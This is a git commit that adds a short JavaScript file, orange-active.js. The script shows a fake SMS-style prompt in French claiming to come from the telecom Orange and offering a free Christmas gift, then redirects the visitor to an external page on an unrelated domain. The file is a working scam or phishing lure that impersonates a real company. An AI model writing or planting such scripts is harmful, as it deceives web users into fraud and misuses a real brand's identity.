37fda0b6850ca1ddf365a508664bfa92cbaf8c51
itidnewblog3 <ukpehaitid1@gmail.com>
2025-11-30 09:10:37 +0100

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,5 @@
+var password = 'OBTENIR UNE OFFRE'
+password=prompt('SMS: Félicitations, votre numéro orange vous permet de recevoir un cadeau de Noël gratuit. Cliquez sur OK pour le recevoir.','OBTENIR UNE OFFRE');
+if (password != 'OBTENIR UNE OFFRE') {
+location.href='https://lhegit.org/xmas-orange.html';
+}
